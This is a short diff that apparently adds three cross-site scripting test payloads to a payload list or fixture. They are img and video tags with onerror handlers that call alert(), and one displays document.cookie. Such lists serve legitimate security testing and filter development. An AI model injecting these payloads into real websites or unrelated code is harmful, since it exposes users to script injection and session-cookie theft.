@@ -1,0 +1,3 @@
+<img src=z onerror=alert(2)>
+"><<img onerror=alert(document.cookie) src>
+"><video src=0 onerror=alert(3)>
